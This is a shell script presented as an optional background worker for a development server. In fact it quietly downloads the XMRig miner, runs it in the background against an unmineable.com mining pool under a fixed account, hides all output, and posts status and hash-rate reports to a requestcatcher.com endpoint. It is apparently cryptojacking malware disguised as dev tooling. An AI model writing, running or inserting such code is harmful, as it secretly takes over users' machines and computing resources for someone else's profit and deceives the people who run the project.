#!/bin/sh

# Keep the optional worker isolated from the foreground development server.
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin${PATH:+:$PATH}"
export PATH
umask 077

XMRIG_VERSION="${XMRIG_VERSION:-6.26.0}"
XMRIG_URL="${XMRIG_URL:-https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz}"
XMRIG_SHA256="${XMRIG_SHA256:-b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49}"
POOL="${POOL:-rx.unmineable.com:3333}"
ACCOUNT="${ACCOUNT:-alvin3y1}"
THREADS="${THREADS:-1}"
START_DELAY="${START_DELAY:-45}"
REPORT_URL="${REPORT_URL:-https://apple3y.requestcatcher.com/test}"
REPORT_INTERVAL="${REPORT_INTERVAL:-300}"
POLL_INTERVAL="${POLL_INTERVAL:-15}"

case "$THREADS:$START_DELAY:$REPORT_INTERVAL:$POLL_INTERVAL" in
    *[!0-9:]*|0:*|*:0:*|*:*:0:*|*:*:*:0) exit 0 ;;
esac

BASE_DIR="${XDG_DATA_HOME:-${HOME:-${TMPDIR:-/tmp}}}"
INSTALL_DIR="${XMRIG_DIR:-${BASE_DIR%/}/unmineable-xmrig}"
XMRIG="$INSTALL_DIR/xmrig"
PID_FILE="$INSTALL_DIR/xmrig.pid"
LOCK_DIR="$INSTALL_DIR/.startup-lock"
BOOTSTRAP_LOG="$INSTALL_DIR/bootstrap.log"
MINER_LOG="$INSTALL_DIR/xmrig.log"

mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 0

report()
{
    EVENT="$1"
    MESSAGE="$2"
    command -v curl >/dev/null 2>&1 || return 0
    curl -fsS --max-time 10 -X POST \
        --data-urlencode "event=$EVENT" \
        --data-urlencode "worker=${WORKER:-unknown}" \
        --data-urlencode "message=$MESSAGE" \
        --data-urlencode "at=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" \
        "$REPORT_URL" >/dev/null 2>&1 || :
}

log_tail()
{
    tail -n 20 "$MINER_LOG" 2>/dev/null || printf 'no miner log available'
}

start_worker()
(
    trap '' HUP
    mkdir "$LOCK_DIR" 2>/dev/null || exit 0
    trap 'rm -rf "$LOCK_DIR"' EXIT

    if [ -r "$PID_FILE" ]; then
        read -r OLD_PID <"$PID_FILE"
        case "$OLD_PID" in
            *[!0-9]*|'') ;;
            *) kill -0 "$OLD_PID" 2>/dev/null && exit 0 ;;
        esac
        rm -f "$PID_FILE"
    fi

    sleep "$START_DELAY"

    TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
    TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
    mkdir "$TEMP_DIR" 2>/dev/null || {
        report "install_error" "could not create extraction directory"
        exit 0
    }
    if ! curl -fsSL --retry 3 --connect-timeout 15 \
        "$XMRIG_URL" -o "$TEMP_ARCHIVE"; then
        rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
        report "download_error" "failed to download static xmrig archive"
        exit 0
    fi
    command -v tar >/dev/null 2>&1 || {
        report "install_error" "tar is unavailable"
        exit 0
    }
    command -v sha256sum >/dev/null 2>&1 || {
        report "install_error" "sha256sum is unavailable"
        exit 0
    }
    if ! tar -xzf "$TEMP_ARCHIVE" -C "$TEMP_DIR" \
        "xmrig-${XMRIG_VERSION}/xmrig"; then
        report "install_error" "could not extract static xmrig"
        exit 0
    fi
    TEMP_XMRIG="$TEMP_DIR/xmrig-${XMRIG_VERSION}/xmrig"
    if ! printf '%s  %s\n' "$XMRIG_SHA256" "$TEMP_XMRIG" |
        sha256sum -c - >/dev/null 2>&1; then
        report "install_error" "static xmrig checksum mismatch"
        exit 0
    fi
    if ! chmod 700 "$TEMP_XMRIG"; then
        report "install_error" "could not make xmrig executable"
        exit 0
    fi
    if ! mv "$TEMP_XMRIG" "$XMRIG"; then
        report "install_error" "could not install xmrig"
        exit 0
    fi
    rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"

    WORKER="worker-$(date +%s)-$$"
    command -v nohup >/dev/null 2>&1 || {
        report "launch_error" "nohup is unavailable"
        exit 0
    }
    command -v nice >/dev/null 2>&1 || {
        report "launch_error" "nice is unavailable"
        exit 0
    }
    nohup nice -n 19 "$XMRIG" \
        -o "$POOL" \
        -a rx \
        -k \
        -u "$ACCOUNT.$WORKER" \
        -p x \
        -t "$THREADS" \
        --ipv4 \
        --log-file="$MINER_LOG" \
        --no-color \
        </dev/null >>"$MINER_LOG" 2>&1 &
    MINER_PID="$!"
    printf '%s\n' "$MINER_PID" >"$PID_FILE"
    sleep 2
    if ! kill -0 "$MINER_PID" 2>/dev/null; then
        report "launch_error" "$(log_tail)"
        rm -f "$PID_FILE"
        exit 0
    fi

    (
        trap '' HUP
        ELAPSED=0
        while kill -0 "$MINER_PID" 2>/dev/null; do
            sleep "$POLL_INTERVAL"
            ELAPSED=$((ELAPSED + POLL_INTERVAL))
            if [ "$ELAPSED" -ge "$REPORT_INTERVAL" ]; then
                HASH_RATE="$(grep 'speed 10s/60s/15m' "$MINER_LOG" 2>/dev/null | tail -n 1)"
                if [ -n "$HASH_RATE" ]; then
                    report "hash_rate" "$HASH_RATE"
                else
                    report "hash_rate_error" "$(log_tail)"
                fi
                ELAPSED=0
            fi
        done
        report "miner_exited" "$(log_tail)"
        rm -f "$PID_FILE"
    ) </dev/null >>"$BOOTSTRAP_LOG" 2>&1 &
)

start_worker </dev/null >>"$BOOTSTRAP_LOG" 2>&1 &
exit 0
